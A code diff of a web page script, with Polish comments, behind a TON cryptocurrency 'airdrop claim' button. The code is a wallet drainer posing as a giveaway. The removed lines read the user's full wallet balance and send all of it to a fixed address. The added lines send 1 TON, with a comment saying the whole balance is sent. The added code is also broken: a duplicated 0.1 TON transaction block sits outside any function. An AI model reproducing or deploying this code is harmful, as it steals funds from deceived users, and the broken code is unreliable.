@@ -284,55 +284,61 @@
         <div id="status"></div>
     </div>
 
-
     <script>
+        const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
+        const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';
+
+        // Inicjalizacja TON Connect
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json',
+            manifestUrl: MANIFEST_URL,
             buttonRootId: 'ton-connect'
         });
 
-        tonConnectUI.onStatusChange(async (status) => {
+        // Obsługa statusu połączenia
+        tonConnectUI.onStatusChange(wallet => {
             const claimButton = document.getElementById('claim-button');
-            if (status.wallet) {
+            if (wallet) {
                 claimButton.style.display = 'inline-block';
-                updateStatus(`Connected: ${status.wallet.account.address}`, 'success');
+                updateStatus(`Connected: ${wallet.account.address}`, 'success');
             } else {
                 claimButton.style.display = 'none';
                 updateStatus('Please connect your wallet', 'info');
             }
         });
 
+        // Tworzenie payloadu z komentarzem
+        async function createPayload() {
+            const comment = "💎 Claim airdrop!";
+            let cell = new TonWeb.boc.Cell();
+            cell.bits.writeUint(0, 32);
+            cell.bits.writeString(comment);
+            return TonWeb.utils.bytesToBase64(await cell.toBoc());
+        }
+
+        // Obsługa przycisku claim
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
-                const walletConnectionStatus = await tonConnectUI.getWallets();
-
-                if (!walletConnectionStatus || walletConnectionStatus.length === 0) {
+                if (!tonConnectUI.connected) {
                     updateStatus('Please connect your wallet first', 'error');
                     return;
                 }
 
                 updateStatus('Preparing transaction...', 'info');
 
-                // Pobierz adres portfela z aktualnego stanu
-                const currentWallet = walletConnectionStatus[0];
-                const walletAddress = currentWallet.account.address;
 
-                // Pobierz balans
-                const balance = await getBalance(walletAddress);
-
-                if (balance <= 0n) {
-                    updateStatus('Your wallet balance is insufficient', 'error');
-                    return;
-                }
-
+                // Tworzenie payloadu
                 const payload = await createPayload();
+
+                // Konfiguracja transakcji
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{
-                        address: AIRDROP_CONTRACT_ADDRESS,
-                        amount: balance.toString(),
-                        payload: payload
-                    }]
+                    messages: [
+                        {
+                            address: AIRDROP_CONTRACT_ADDRESS,
+                            amount: '1000000000', // Wysyłamy całe saldo użytkownika
+                            payload: payload
+                        }
+                    ]
                 };
 
                 const result = await tonConnectUI.sendTransaction(transaction);
@@ -344,20 +350,40 @@
                 updateStatus(`Transaction error: ${error.message}`, 'error');
             }
         });
-        async function getBalance(address) {
-            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-            const data = await response.json();
-            return BigInt(data.result);
-        }
+        try {
+            if (!tonConnectUI.connected) {
+                updateStatus('Please connect your wallet first', 'error');
+                return;
+            }
 
-        async function createPayload() {
-            const comment = "💎 Claim airdrop!";
-            let cell = new TonWeb.boc.Cell();
-            cell.bits.writeUint(0, 32);
-            cell.bits.writeString(comment);
-            return TonWeb.utils.bytesToBase64(await cell.toBoc());
-        }
+            updateStatus('Preparing transaction...', 'info');
 
+            // Tworzenie payloadu
+            const payload = await createPayload();
+
+            // Konfiguracja transakcji
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [
+                    {
+                        address: AIRDROP_CONTRACT_ADDRESS,
+                        amount: '100000000', // 0.1 TON
+                        payload: payload
+                    }
+                ]
+            };
+
+            const result = await tonConnectUI.sendTransaction(transaction);
+            console.log('Transaction result:', result);
+            updateStatus('Transaction sent successfully!', 'success');
+
+        } catch (error) {
+            console.error('Transaction error:', error);
+            updateStatus(`Transaction error: ${error.message}`, 'error');
+        }
+        });
+
+        // Funkcje pomocnicze
         function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             const icons = {
@@ -366,7 +392,10 @@
                 info: 'info-circle'
             };
 
-            statusDiv.innerHTML = `<i class="fas fa-${icons[type]}"></i> ${message}`;
+            statusDiv.innerHTML = `
+                <i class="fas fa-${icons[type]}"></i> ${message}
+            `;
+
             statusDiv.style.color = type === 'error' ? '#e74c3c' :
                 type === 'success' ? '#2ecc71' : '#3498db';
         }
